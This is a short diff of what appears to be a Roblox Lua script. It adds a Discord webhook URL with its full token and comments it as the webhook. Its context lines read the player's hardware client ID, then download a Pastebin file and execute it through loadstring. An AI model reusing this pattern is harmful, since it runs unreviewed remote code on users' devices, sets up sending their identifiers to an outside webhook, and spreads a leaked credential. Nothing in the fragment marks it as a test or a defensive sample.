@@ -1,3 +1,8 @@
+local url = "https://discord.com/api/webhooks/1365291278308343971/A24HqgyDAIUqnXt66Ve4-E1_S8dhXpb1X82aG1mXkneqSKYgpsNGmVqCTXYKn_x3QIh7" -- // WebHook Here
+
+
+
+
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 local hwidPaste = loadstring(game:HttpGet("https://pastebin.com/raw/nxzxu2zV"))()
 local Players = game:GetService("Players")
